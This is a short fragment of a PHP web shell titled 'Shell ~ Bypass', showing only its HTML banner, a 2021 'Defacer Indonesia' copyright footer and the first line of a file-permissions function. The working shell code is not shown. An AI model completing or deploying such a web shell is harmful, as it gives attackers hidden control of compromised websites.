...
<a href="?"><h1 style="font-family: Kelly Slab; font-size: 35px; color: white;">Shell ~ Bypass</h1></a> 
<center><b><font face="Courier New" color="white" size="5">[+] Kelelawar Cyber Team [+]</font></b></center>
<BODY>
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px #00FAFF, 0 0 5px #00FAFF, 0 0 7px red, 0 0 45px #00FAFF; font-weight:bold: white; font-size:15px">Copyright &copy;2021 || Defacer Indonesia</center>
</body>
</html>';
function perms($file){
